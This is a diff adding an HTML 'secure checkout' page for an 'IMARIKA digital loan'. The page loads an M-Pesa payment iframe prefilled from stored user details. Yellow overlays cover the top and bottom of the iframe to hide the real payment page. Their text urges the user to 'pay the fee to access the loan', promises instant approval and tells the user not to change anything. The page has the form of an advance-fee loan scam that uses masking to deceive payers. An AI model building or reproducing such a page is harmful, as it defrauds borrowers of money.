@@ -1,0 +1,261 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>IMARIKA Secure Checkout</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #000;
+    }
+
+    .modal {
+      position: fixed;
+      z-index: 9999;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background-color: rgba(0, 0, 0, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      position: relative;
+      width: 95%;
+      max-width: 420px;
+      height: 90%;
+      background: white;
+      border-radius: 12px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .iframe-wrapper {
+      position: relative;
+      flex: 1;
+      width: 100%;
+      height: 100%;
+    }
+
+    .iframe-wrapper iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .iframe-cover {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 60px;
+      width: 100%;
+      background: #ffd700;
+      z-index: 2;
+      color: white;
+      font-size: 13px;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 6px 12px;
+      box-sizing: border-box;
+    }
+
+    .iframe-cover b {
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .iframe-bottom-blackout {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      height: 180px;
+      width: 100%;
+      background-color: #ffd700;
+      z-index: 2;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      align-items: center;
+      text-align: center;
+      font-family: sans-serif;
+      padding: 10px;
+      box-sizing: border-box;
+    }
+
+    .iframe-bottom-blackout b {
+      font-size: 14px;
+      margin-bottom: 6px;
+    }
+
+    .scroll-text {
+      font-size: 14px;
+      animation: bounce 1.2s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(8px);
+      }
+    }
+
+    .marquee {
+      width: 100%;
+      overflow: hidden;
+      white-space: nowrap;
+      box-sizing: border-box;
+      border-top: 1px solid #333;
+      border-bottom: 1px solid #333;
+      padding: 4px 0;
+      background-color: #111;
+      color: #0c8f8f;
+      font-size: 13px;
+      font-weight: bold;
+      position: absolute;
+      bottom: 140px;
+      z-index: 3;
+      font-family: monospace;
+    }
+
+    .marquee span {
+      display: inline-block;
+      padding-left: 100%;
+      animation: marquee 12s linear infinite;
+    }
+
+    @keyframes marquee {
+      0%   { transform: translateX(0); }
+      100% { transform: translateX(-100%); }
+    }
+  </style>
+
+<style>
+  .modal-content {
+    animation: fadeSlideIn 0.6s ease forwards;
+    transform: translateY(30px);
+    opacity: 0;
+  }
+
+  @keyframes fadeSlideIn {
+    to {
+      transform: translateY(0);
+      opacity: 1;
+    }
+  }
+
+  #closeBtn:hover {
+    transform: scale(1.2);
+    transition: transform 0.2s ease;
+  }
+</style>
+
+
+<audio id="clickSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3" preload="auto"></audio>
+
+<style>
+  body {
+    opacity: 0;
+    transition: opacity 0.6s ease-in-out;
+  }
+  body.loaded {
+    opacity: 1;
+  }
+</style>
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    document.body.classList.add("loaded");
+  });
+</script>
+
+</head>
+<body>
+
+<!-- Modal-style iframe embed -->
+
+<div id="closeBtn" style="position: absolute; top: 12px; right: 14px; font-size: 20px; font-weight: bold; color: white; cursor: pointer; z-index: 10000;">
+  ✖
+</div>
+
+<div class="modal">
+  <div class="modal-content">
+    <div class="iframe-wrapper">
+      <div class="iframe-cover">
+        <b>IMARIKA DIGITAL LOAN DISBURSEMENT PAGE</b>
+        🔐 secure payments instant approval
+                 <span style="color: red; font-weight: bold; font-size: 14px;">❗️DONT CHANGE ANYTHING HERE JUST CLICK PAY BUTTON BELOW</span>
+      </div>
+      <div class="marquee">
+        <span>💳 Fast, secure payments · 🚚 Instant delivery guaranteed · 💼 Trusted by thousands · 🔐 Seamless checkout experience ·</span>
+      </div>
+      <div class="iframe-bottom-blackout">
+       <b>PAY THE FEE TO ACCESS THE LOAN.ONCE PAID LOAN IS APPROVED INSTANTLY AND SENT TO YOUR SET MPESA NUMBER</b>
+        <b>Alternative options are disabled</b>
+        Use the green button above to complete payment
+        <div class="scroll-text">👇 Scroll down to pay</div>
+      </div>
+      <iframe id="payFrame" src="" allowpaymentrequest></iframe>
+    </div>
+  </div>
+</div>
+
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const name = localStorage.getItem("imarika_checkout_name") || "";
+    const phone = localStorage.getItem("imarika_checkout_phone") || "";
+    const amount = localStorage.getItem("imarika_checkout_fee") || "";
+    const reference = localStorage.getItem("imarika_checkout_reference") || "";
+
+    if (!phone || !amount || !name) {
+      document.body.innerHTML = "<div style='color: white; text-align: center; margin-top: 50px; font-size: 18px;'>❌ Missing checkout details. Please return to the product page.</div>";
+      throw new Error("Missing required checkout data");
+    }
+
+    const payURL = `https://app.payhero.co.ke/lipwa/1868?amount=${amount}&channel_id=2942&currency=KES&phone=${phone}&reference=${reference}&name=${encodeURIComponent(name)}`;
+    document.getElementById("payFrame").src = payURL;
+  });
+</script>
+
+
+<script>
+  document.getElementById("closeBtn").addEventListener("click", function () {
+    if (window.parent !== window) {
+      // If inside iframe, post message to parent
+      window.parent.postMessage({ action: "closeCheckout" }, "*");
+    } else {
+      // If full-page, just redirect back
+      window.location.href = "offers.html";
+    }
+  });
+</script>
+
+
+<script>
+  function playClickSound() {
+    const sound = document.getElementById("clickSound");
+    if (sound) sound.play().catch(() => {});
+  }
+
+  // Attach sound to buttons (buy now and close)
+  document.addEventListener("DOMContentLoaded", () => {
+    document.querySelectorAll("button, .button, #closeBtn").forEach(btn => {
+      btn.addEventListener("click", playClickSound);
+    });
+  });
+</script>
+
+</body>
+</html>
